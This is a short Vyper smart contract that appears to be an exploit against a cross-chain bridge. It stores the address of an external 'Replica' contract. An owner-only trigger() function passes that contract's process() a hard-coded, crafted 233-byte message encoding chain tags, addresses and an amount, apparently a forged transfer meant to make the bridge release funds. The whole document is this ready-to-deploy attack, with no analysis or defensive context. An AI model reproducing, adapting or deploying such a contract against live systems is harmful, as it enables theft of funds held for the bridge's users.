# Author by Supremacy Inc. #
# @version ^0.3.0

interface IReplica:
    def process(_bytes: Bytes[1000]) -> bool: nonpayable

owner: public(address)
replica: public(IReplica)

@external
def __init__():
    self.owner = msg.sender
    self.replica = IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA)

@external
def trigger() -> bool:
    assert msg.sender == self.owner, "Not your biz!"
    payload: Bytes[233] = b'beam\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd3\xdf\xd3\xed\xe7N\r\xce\xbc\x1a\xa6\x85\xe1Q3(W\xef\xce-\x00\x00\x13\xd6\x00eth\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\xa6\x9bNi\x8aK\t\r\xf6\xcf[\xd7\xb2\xd4s%\xad0\xa3\x00eth\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"`\xfa\xc5\xe5T*w:\xa4O\xbc\xfe\xdf|\x19;\xc2\xc5\x99\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc9\\U\x8d\xaac\xb1\xa7\x931\xb2\xabJ*z\xf3u8M;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02T\x0b\xe4\x00\xe6\xe8]\xed\x01\x88\x19 \x9c\xfb\x94\x8d\x07L\xb6]\xe1EsK[\x08R\xe4\xa5\xdb%\xca\xc2\xb8\xc3\x9a'
    self.replica.process(payload)
    return True